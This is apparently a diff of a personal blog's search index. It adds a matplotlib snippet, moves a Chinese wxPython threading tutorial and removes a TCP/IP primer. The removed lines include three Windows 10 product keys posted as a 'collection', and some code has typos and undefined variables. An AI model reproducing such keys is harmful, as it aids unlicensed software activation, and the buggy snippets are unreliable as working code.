+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">plt.gca().xaxis.set_major_locator(plt.NullLocator())<br>plg.gca().yaxis.set_major_locator(plt.NullLocator())<br>plt.subplots_adjust(top =<span class="hljs-number">1</span>,bottom=<span class="hljs-number">0</span>,right=<span class="hljs-number">0</span>,hspace=<span class="hljs-number">0</span>,wspace=<span class="hljs-number">0</span>)<br>plt.margins(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)<br>fig.savefig(out_png_path,format=<span class="hljs-string">'png'</span>,transparent=<span class="hljs-literal">True</span>,dip=<span class="hljs-number">300</span>,pad_inches=<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure>
+
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>docs</category>
+        <category>python</category>
+        <category>index</category>
       </categories>
       <tags>
         <tag>Python</tag>
-        <tag>Tools</tag>
+        <tag>matplotlib</tag>
       </tags>
   </entry>
   <entry>
-    <title>Windows Collections</title>
-    <url>/2018/11/22/windows-collections/</url>
-    <content><![CDATA[<p>##windows 10 license</p>
-<p><strong>license</strong><br>Win10专业版 7M2H3-J3VPB-2X2DK-33CC2-CHPH4 ​<br>Win10 企业版：XCBWP-GN2BX-QJDYV-XQV7K-C7JWR Win10<br>专业版：V942D-C7NFG-773PY-MT398-F3KTY</p>
-<p>Collection up to spare</p>
-]]></content>
-      <categories>
-        <category>license</category>
-        <category>windows</category>
-        <category>index</category>
-      </categories>
-      <tags>
-        <tag>windows,license,collect</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>TCP/IP基础知识总结</title>
-    <url>/2020/11/05/tcpip/</url>
-    <content><![CDATA[<p>我们接触计算机网络最多的协议，那就是TCP/IP协议了，TCP/IP协议同时也是互联网中最为著名的协议。</p>
-<a id="more"></a>
+    <title>WxPython多线程使用</title>
+    <url>/2021/05/18/wxpython/</url>
+    <content><![CDATA[<p>最近接触wxpython，有个后台程序绑定按钮事件，发现如果后台程序是循环或者多线程，在触发按钮事件后，会导致GUI界面卡死。</p>
+<p>了解到<code>wx.CallAfter</code>和<code>PubSub</code> 的使用，<code>CallAfter</code>负责将线程执行结果推送给主程序，<code>PubSub</code>实现应用程序与其他线程的通信,使用一个简单地进度条的实现来记录一下</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> wx<br><span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> Thread<br><span class="hljs-keyword">from</span> wx.lib.pubsub <span class="hljs-keyword">import</span> pub<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestThread</span><span class="hljs-params">(Thread)</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self,diefu,old_data,pinlv)</span>:</span><br>        <span class="hljs-comment">#线程实例化时立即启动</span><br>        self.diefu = diefu<br>        self.old_data = old_data<br>        self.pinlv = pinlv<br>        Thread.__init__(self)<br>        self.start()<br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span><span class="hljs-params">(self)</span>:</span><br>      <span class="hljs-comment">#线程执行的代码</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            sleep = int(self.pinlv)*<span class="hljs-number">60</span><br>            time.sleep(sleep)<br>            now_time = datetime.datetime.now()<br>            utc_t = now_time.astimezone(tz=utc)<br>            utc_time = utc_t.replace(tzinfo=<span class="hljs-literal">None</span>)<br>            print(utc_time)<br>            <span class="hljs-keyword">if</span> utc_time &gt; self.time_end():<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">else</span>:<br>                tmp = self.do_check_update(diefu,old_data)<br>                old_data = tmp<br>                self.update_json(old_data)<br>            wx.CallAfter(pub.sendMessage, <span class="hljs-string">"update"</span>, msg=i)<br>            time.sleep(<span class="hljs-number">0.5</span>)<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyForm</span> <span class="hljs-params">( wx.Frame )</span>:</span><br>  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">( self, parent )</span>:</span><br>    wx.Frame.__init__ ( self, parent, id = wx.ID_ANY, title = <span class="hljs-string">"www.OmegaXYZ.com"</span>, pos = wx.DefaultPosition, size = wx.Size( <span class="hljs-number">-1</span>,<span class="hljs-number">-1</span> ), style = wx.DEFAULT_FRAME_STYLE|wx.TAB_TRAVERSAL )<br>    self.SetSizeHints( wx.DefaultSize, wx.DefaultSize )<br>    gSizer2 = wx.GridSizer( <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span> )<br>    self.m_button2 = wx.Button( self, wx.ID_ANY, <span class="hljs-string">"执行线程"</span>, wx.DefaultPosition, wx.DefaultSize, <span class="hljs-number">0</span> )<br>    gSizer2.Add( self.m_button2, <span class="hljs-number">0</span>, wx.ALL|wx.ALIGN_CENTER_HORIZONTAL|wx.ALIGN_CENTER_VERTICAL, <span class="hljs-number">5</span> )<br>    self.m_staticText2 = wx.StaticText( self, wx.ID_ANY, <span class="hljs-string">"MyLabel"</span>, wx.DefaultPosition, wx.DefaultSize, <span class="hljs-number">0</span> )<br>    self.m_staticText2.Wrap( <span class="hljs-number">-1</span> )<br>    gSizer2.Add( self.m_staticText2, <span class="hljs-number">0</span>, wx.ALL|wx.ALIGN_CENTER_HORIZONTAL|wx.ALIGN_CENTER_VERTICAL, <span class="hljs-number">5</span> )<br>    self.m_gauge1 = wx.Gauge( self, wx.ID_ANY, <span class="hljs-number">100</span>, wx.DefaultPosition, wx.DefaultSize, wx.GA_HORIZONTAL )<br>    self.m_gauge1.SetValue( <span class="hljs-number">0</span> )<br>    gSizer2.Add( self.m_gauge1, <span class="hljs-number">0</span>, wx.ALL|wx.ALIGN_CENTER_HORIZONTAL|wx.ALIGN_CENTER_VERTICAL, <span class="hljs-number">5</span> )<br>    self.SetSizer( gSizer2 )<br>    self.Layout()<br>    gSizer2.Fit( self )<br>    self.Centre( wx.BOTH )<br>    self.m_button2.Bind( wx.EVT_BUTTON, self.onButton )<br><br>    pub.subscribe(self.updateDisplay, <span class="hljs-string">"update"</span>)<br>  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">updateDisplay</span><span class="hljs-params">(self, msg)</span>:</span><br>    t = msg<br>    <span class="hljs-keyword">if</span> isinstance(t, int):<span class="hljs-comment">#如果是数字，说明线程正在执行，显示数字</span><br>      self.m_staticText2.SetLabel(<span class="hljs-string">"%s%%"</span> % t)<br>      self.m_gauge1.SetValue( t )<br>    <span class="hljs-keyword">else</span>:<span class="hljs-comment">#否则线程未执行，将按钮重新开启</span><br>      self.m_staticText2.SetLabel(<span class="hljs-string">"%s"</span> % t)<br>      self.m_button2.Enable()<br>  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">onButton</span><span class="hljs-params">( self, event )</span>:</span><br>    TestThread(<span class="hljs-string">'1'</span>,<span class="hljs-string">'2'</span>,<span class="hljs-string">'3'</span>)<br>    self.m_staticText2.SetLabel(<span class="hljs-string">"线程开始"</span>)<br>    event.GetEventObject().Disable()<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:<br>  app = wx.App()<br>  MyForm(<span class="hljs-literal">None</span>).Show()<br>  app.MainLoop()<br></code></pre></td></tr></table></figure>
 
-<h3 id="TCP-IP的历史背景"><a href="#TCP-IP的历史背景" class="headerlink" title="TCP/IP的历史背景"></a>TCP/IP的历史背景</h3><p>最初还没有TCP/IP协议的时候，也就是再20世纪60年代，许多国家和地区认识到通信技术的重要性。美国国防部希望能够研究一种即时通信线路被破坏也能够通过其他路线进行通信的技术。为了实现这种技术，出现了<strong>分组</strong>网络。</p>
-<p><img src="https://images.yrzdm.com/imgs/20201103/wFis57CA2YOm.png?imageslim" alt="分组网络"></p>
-<p>即使再两个节点通信的过程中，几个节点遭到破坏，却依然能够通过改变线路等方式使得两个节点之间进行通信。</p>
-<p>这种分组网络促使了<strong>ARPANET（advanced Research Projects Agency Network）</strong>的诞生。ARPANET是第一个具有分布式控制的广域包分t组交换网络，也是最早实现TCP/IP协议的前身。</p>
-<p><img src="https://images.yrzdm.com/imgs/20201104/YPnHWGVAQHxa.png?imageslim" alt="TCP/IP协议包含的协议"></p>
-<p>以上协议汇总起来，就是TCP/IP协议蔟。</p>
-<h3 id="TCP-IP标准"><a href="#TCP-IP标准" class="headerlink" title="TCP/IP标准"></a>TCP/IP标准</h3><p>TCP/IP 相较于其他的协议标准，更注重<strong>开放性</strong>和<strong>实用性</strong>，即标准能否被实际应用。TCP/IP标准协议就是我们班所熟知的<strong>RFC文档</strong>，RFC不仅规范了协议标准还包含了协议的实现和使用信息。</p>
-<p><a class="link"   href="https://www.rfc-editor.org/rfc-index.html"  target="_blank" rel="noopener">More about RFC<i class="fas fa-external-link-alt"></i></a></p>
-<h3 id="TCP-IP协议簇"><a href="#TCP-IP协议簇" class="headerlink" title="TCP/IP协议簇"></a>TCP/IP协议簇</h3><p>OSI模型一共有七层，从下到上分别是物理层，数据链路层，网络层，传输层(运输层)，会话层，表示层和应用层。</p>
-<p>简化为：应用层，传输层，网络层，通信链路层。</p>
-<p><img src="https://images.yrzdm.com/imgs/20201104/2R7lQxHvCCz2.png?imageslim" alt="简化协议簇"></p>
-<p>我们从通信链路层开始介绍一下这些系一层以及层之间的协议。</p>
-<h4 id="通信链路层"><a href="#通信链路层" class="headerlink" title="通信链路层"></a>通信链路层</h4><p>如果非要细分的话，通信链路层也可以分为物理层和数据链路层。</p>
-<h4 id="物理层"><a href="#物理层" class="headerlink" title="物理层"></a>物理层</h4><p>物理层是TCP/IP的最底层是负责传输的硬件，这种哦硬件就相当于是以太网或者电话线路等物理层的设备。</p>
-<h4 id="数据链路层"><a href="#数据链路层" class="headerlink" title="数据链路层"></a>数据链路层</h4><p>数据链路层位于物理层和网络层中间，数据链路层定义了在单个链路上如何传输数据。</p>
-<h4 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h4><p>网络层主要使用<strong>IP</strong>协议，IP协议基于IP地址转发分包数据。<br><img src="https://images.yrzdm.com/imgs/20201104/t3zhMe2TUgk2.png?imageslim" alt="网络层"></p>
-<p>IP协议的主要作用就是将分组数据包发送到目标主机。<br>TCP/IP 分层中的互联网层与传输层的功能通常由操作系统提供。<br>IP协议还隐含着数据链路层的功能，通过IP协议，相互通信的主机之间不论经过怎样的数据链路，都能够实现相互通信。<br>虽然IP也是一种分组交换协议，但是IP协议却不具备重发机制。及时数据没有到达另一端也不会进行重发，所以IP属于非可靠性协议。</p>
-<p>网络层还有一种协议就是<strong>ICMP</strong>，因为IP协议在数据包的发送过程中可能会出现异常，当IP数据包因为异常而无法到达目标地址时，需要给发送端发送一个异常通知，ICMP的主要功能就在于此，ICMP也可以被用来诊断网络状况。</p>
-<h4 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h4><p>TCP协议是传输层协议的一种</p>
-<p>传输层就像高速公路一样，连接两个城市的道路。它的主要功能是让应用层的应用程序之间完成通信和数据交换。在计算机内部运行着很多应用程序，每个应用程序对应一个端口号，我们一般使用端口号来区分这些应用程序。<br><img src="https://images.yrzdm.com/imgs/20201104/H0MHWQCotSfW.png?imageslim" alt="传输层"></p>
-<p>传输层的协议主要分为面向有连接的协议TCP和面向无连接的协议UDP</p>
-<h4 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h4><p>TCP是一种可靠的协议，它能够保证数据包的可靠性交付，TCP能够正确处理传输过程中的丢包、传输顺序错乱等异常情况。此外，TCP还提供拥塞控制用于缓解网络拥堵。</p>
-<h4 id="UDP"><a href="#UDP" class="headerlink" title="UDP"></a>UDP</h4><p>UDP是一种不可靠协议，它无法保证数据的可靠交付，相比TCP，UDP不会检查数据包是否到达，网络是否阻塞等情况，但是UDP的效率比较高。</p>
-<p>UDP协议常用于分组数据较少或者广播，多播等视频通信和多媒体领域。</p>
-<h3 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h3><p>在TCP/IP协议簇中，将OSI标准模型中的会话层，表示层都归为应用层。应用层的架构大多属于客户端/服务端模型。在这种架构中，服务端通常会提前部署到服务器上，等待客户端的连接，从而提供服务。</p>
-<p><img src="https://images.yrzdm.com/imgs/20201104/IiElWxTMUlcV.png?imageslim" alt="应用层"></p>
-<h3 id="数据包的发送过程"><a href="#数据包的发送过程" class="headerlink" title="数据包的发送过程"></a>数据包的发送过程</h3><h4 id="数据包结构"><a href="#数据包结构" class="headerlink" title="数据包结构"></a>数据包结构</h4><p><img src="https://images.yrzdm.com/imgs/20201104/7gQO3mKkTNs9.png?imageslim" alt="数据包结构"></p>
-<p>在每一层中，都会对所发送的数据增加一个<strong>头</strong> ，这个头中包含了该层必要的信息。每一层都会对数据进行处理并在数据包中附上这一层的必要信息。</p>
-<h4 id="应用层的处理"><a href="#应用层的处理" class="headerlink" title="应用层的处理"></a>应用层的处理</h4><p>主机A打开某应用程序，或者打开聊天窗口输入<strong>Hello</strong>，点击发送，那么这个<strong>Hello</strong>就作为一个数据包遨游在网络中，首先应用层会对这个数据包进行处理，包括字符编码、格式化等等，这其实是OSI中表现层的工作，只不过在TCP/IP协议中都归为了应用层。<br>数据包在发送的那一刻建立TCP连接，这个连接相当于通道，在这之后其他数据包也会使用通道传输数据。</p>
-<h4 id="传输层的处理"><a href="#传输层的处理" class="headerlink" title="传输层的处理"></a>传输层的处理</h4><p>为了描述信息能够准确的到达另一方，我们使用TCP协议来进行描述。TCP会根据应用的指示，负责建立连接，发送数据和断开连接。</p>
-<p>TCP会在应用数据层的前端附加一个TCP的头部字段，TCP头部包含了<strong>源端口号</strong>和<strong>目标端口号</strong>，这两个端口号用于表明数据包是从哪里发出的，需要发送到哪个应用程序上；TCP头部还包含<strong>序号</strong>，用于表示该包中数据是发送端整个数据中的第几个字节的序列号；TCP头部还包含<strong>校验和</strong>，用于判断数据是否损坏，随后将TCP头部附加在数据包的头部发送给IP</p>
-<h4 id="网络层的处理"><a href="#网络层的处理" class="headerlink" title="网络层的处理"></a>网络层的处理</h4><p>网络层主要负责处理数据包的是IP协议，IP协议将TCP传过来的TCP头部和数据结合当作自己的数据，并在TCP头部的前端加上自己的IP头部。因此，IP数据包后面会紧跟着TCP数据包，后面才是数据本身。IP头部包含目标地址和源地址，紧随在IP头部的还有用来判断后面是TCP还是UDP的信息。</p>
-<p>IP包生成后，会由路由控制表判断应该发送到哪个主机，IP修饰后的数据继续向下发送给路由器或者网络接口的驱动程序，从而实现真正的数据传输。</p>
-<h4 id="通信链路层的处理"><a href="#通信链路层的处理" class="headerlink" title="通信链路层的处理"></a>通信链路层的处理</h4><p>经由IP传过来的数据包，以太网会给数据包附上以太网的头部信息并进行发送处理。以太网头部信息包含接收端的MAC地址、发送端的MAC地址以及以太网类型的以太网数据协议等。</p>
-<p>以下是完整的处理过程和解析过程。</p>
-<p><img src="https://images.yrzdm.com/imgs/20201104/jNAT6FJbiQXq.png?imageslim" alt="传输解析"></p>
-<p>左侧是数据的发送处理过程，应用层数据经过层层处理后变为可以发送昂的数据包，经过物理介质发送到指定主机中。</p>
-<p>数据包的接收流程是发送流程的逆序过程，数据包的解析同样会经过下面这几步。</p>
-<h4 id="通信链路的解析"><a href="#通信链路的解析" class="headerlink" title="通信链路的解析"></a>通信链路的解析</h4><p>目标主机收到数据包后，首选会从以太网的头部找到MAC地址判断是否是发给自己的数据包，如果不是发给自己的数据包则会丢弃该数据包。</p>
-<p>如果收到的数据包是发送给自己的，就会查找以太网类型判断是那种协议，如果是IP协议就会扔给IP协议进行处理。如果是<strong>ARP</strong>协议就会给ARP协议进行处理。如果协议类型是一宗无法识别的协议，就会将该数据包直接丢弃。</p>
-<h4 id="网络层的解析"><a href="#网络层的解析" class="headerlink" title="网络层的解析"></a>网络层的解析</h4><p>经过以太网处理后的数据包扔给网络层进行处理，我们假设协议类型是IP协议，那么，在IP收到数据包后就会解析IP头部信息，判断IP头部信息中的IP地址是否和自己的IP地址匹配，如果匹配则接受数据并判断上一层协议是TCP还是UDP，如果不匹配则直接丢弃。</p>
-<blockquote>
-<p>在路由的转发过程中，有的时候IP地址并不是自己的，这个时候需要借助路由表协助处理。</p>
-</blockquote>
-<h4 id="传输层的处理-1"><a href="#传输层的处理-1" class="headerlink" title="传输层的处理"></a>传输层的处理</h4><p>在传输层中，我们默认使用TCP协议，在TCP处理过程中，首先会计算一下<strong>校验和</strong>，判断数据是否被损坏。然后检查是否按照序号接受数据，最后检查端口号，确定具体是哪个应用程序。</p>
-<p>数据被完整识别后，会传递给由端口号识别的应用程序进行处理。</p>
-<h4 id="应用程序的处理"><a href="#应用程序的处理" class="headerlink" title="应用程序的处理"></a>应用程序的处理</h4><p>接收端指定的应用程序会处理发送方传递过来的数据，通过解码等操作识别出数据的内容，然后把对应的数据存储在磁盘上，返回一个保存成功的消息给发送方，如果保存失败，则返回错误消息。</p>
-<p>数据包经过每层后，该层协议都会在数据包附上头部信息。</p>
-<p><img src="https://images.yrzdm.com/imgs/20201105/mhGyjVXW77LA.png?imageslim" alt="包解析处理"></p>
-<p>在数据包的发送过程中，各层以此对数据包添加了头部信息，每个头部都包含发送端和接收端地址以及上一层的协议类型。以太网会使用MAC地址，IP会用IP地址，TCP/UDP则会用端口号作为识别两端主机的地址。</p>
-<p>每个分层的包首部还包含一个识别位，它是用来标识上一层协议的种类信息。</p>
 ]]></content>
       <categories>
         <category>docs</category>
@@ -3552,7 +3588,7 @@ sudo apt-get upgrade</code></p>
         <category>index</category>
       </categories>
       <tags>
-        <tag>basic,protocol,network</tag>
+        <tag>Python</tag>
       </tags>
   </entry>
   <entry>
@@ -3588,23 +3624,6 @@ sudo apt-get upgrade</code></p>
       </categories>
       <tags>
         <tag>Python,word</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>WxPython多线程使用</title>
-    <url>/2021/05/18/wxpython/</url>
-    <content><![CDATA[<p>最近接触wxpython，有个后台程序绑定按钮事件，发现如果后台程序是循环或者多线程，在触发按钮事件后，会导致GUI界面卡死。</p>
-<p>了解到<code>wx.CallAfter</code>和<code>PubSub</code> 的使用，<code>CallAfter</code>负责将线程执行结果推送给主程序，<code>PubSub</code>实现应用程序与其他线程的通信,使用一个简单地进度条的实现来记录一下</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> wx<br><span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> Thread<br><span class="hljs-keyword">from</span> wx.lib.pubsub <span class="hljs-keyword">import</span> pub<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestThread</span><span class="hljs-params">(Thread)</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self,diefu,old_data,pinlv)</span>:</span><br>        <span class="hljs-comment">#线程实例化时立即启动</span><br>        self.diefu = diefu<br>        self.old_data = old_data<br>        self.pinlv = pinlv<br>        Thread.__init__(self)<br>        self.start()<br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span><span class="hljs-params">(self)</span>:</span><br>      <span class="hljs-comment">#线程执行的代码</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            sleep = int(self.pinlv)*<span class="hljs-number">60</span><br>            time.sleep(sleep)<br>            now_time = datetime.datetime.now()<br>            utc_t = now_time.astimezone(tz=utc)<br>            utc_time = utc_t.replace(tzinfo=<span class="hljs-literal">None</span>)<br>            print(utc_time)<br>            <span class="hljs-keyword">if</span> utc_time &gt; self.time_end():<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">else</span>:<br>                tmp = self.do_check_update(diefu,old_data)<br>                old_data = tmp<br>                self.update_json(old_data)<br>            wx.CallAfter(pub.sendMessage, <span class="hljs-string">"update"</span>, msg=i)<br>            time.sleep(<span class="hljs-number">0.5</span>)<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyForm</span> <span class="hljs-params">( wx.Frame )</span>:</span><br>  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">( self, parent )</span>:</span><br>    wx.Frame.__init__ ( self, parent, id = wx.ID_ANY, title = <span class="hljs-string">"www.OmegaXYZ.com"</span>, pos = wx.DefaultPosition, size = wx.Size( <span class="hljs-number">-1</span>,<span class="hljs-number">-1</span> ), style = wx.DEFAULT_FRAME_STYLE|wx.TAB_TRAVERSAL )<br>    self.SetSizeHints( wx.DefaultSize, wx.DefaultSize )<br>    gSizer2 = wx.GridSizer( <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span> )<br>    self.m_button2 = wx.Button( self, wx.ID_ANY, <span class="hljs-string">"执行线程"</span>, wx.DefaultPosition, wx.DefaultSize, <span class="hljs-number">0</span> )<br>    gSizer2.Add( self.m_button2, <span class="hljs-number">0</span>, wx.ALL|wx.ALIGN_CENTER_HORIZONTAL|wx.ALIGN_CENTER_VERTICAL, <span class="hljs-number">5</span> )<br>    self.m_staticText2 = wx.StaticText( self, wx.ID_ANY, <span class="hljs-string">"MyLabel"</span>, wx.DefaultPosition, wx.DefaultSize, <span class="hljs-number">0</span> )<br>    self.m_staticText2.Wrap( <span class="hljs-number">-1</span> )<br>    gSizer2.Add( self.m_staticText2, <span class="hljs-number">0</span>, wx.ALL|wx.ALIGN_CENTER_HORIZONTAL|wx.ALIGN_CENTER_VERTICAL, <span class="hljs-number">5</span> )<br>    self.m_gauge1 = wx.Gauge( self, wx.ID_ANY, <span class="hljs-number">100</span>, wx.DefaultPosition, wx.DefaultSize, wx.GA_HORIZONTAL )<br>    self.m_gauge1.SetValue( <span class="hljs-number">0</span> )<br>    gSizer2.Add( self.m_gauge1, <span class="hljs-number">0</span>, wx.ALL|wx.ALIGN_CENTER_HORIZONTAL|wx.ALIGN_CENTER_VERTICAL, <span class="hljs-number">5</span> )<br>    self.SetSizer( gSizer2 )<br>    self.Layout()<br>    gSizer2.Fit( self )<br>    self.Centre( wx.BOTH )<br>    self.m_button2.Bind( wx.EVT_BUTTON, self.onButton )<br><br>    pub.subscribe(self.updateDisplay, <span class="hljs-string">"update"</span>)<br>  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">updateDisplay</span><span class="hljs-params">(self, msg)</span>:</span><br>    t = msg<br>    <span class="hljs-keyword">if</span> isinstance(t, int):<span class="hljs-comment">#如果是数字，说明线程正在执行，显示数字</span><br>      self.m_staticText2.SetLabel(<span class="hljs-string">"%s%%"</span> % t)<br>      self.m_gauge1.SetValue( t )<br>    <span class="hljs-keyword">else</span>:<span class="hljs-comment">#否则线程未执行，将按钮重新开启</span><br>      self.m_staticText2.SetLabel(<span class="hljs-string">"%s"</span> % t)<br>      self.m_button2.Enable()<br>  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">onButton</span><span class="hljs-params">( self, event )</span>:</span><br>    TestThread(<span class="hljs-string">'1'</span>,<span class="hljs-string">'2'</span>,<span class="hljs-string">'3'</span>)<br>    self.m_staticText2.SetLabel(<span class="hljs-string">"线程开始"</span>)<br>    event.GetEventObject().Disable()<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:<br>  app = wx.App()<br>  MyForm(<span class="hljs-literal">None</span>).Show()<br>  app.MainLoop()<br></code></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>docs</category>
-        <category>python</category>
-        <category>index</category>
-      </categories>
-      <tags>
-        <tag>Python</tag>
       </tags>
   </entry>
 </search>
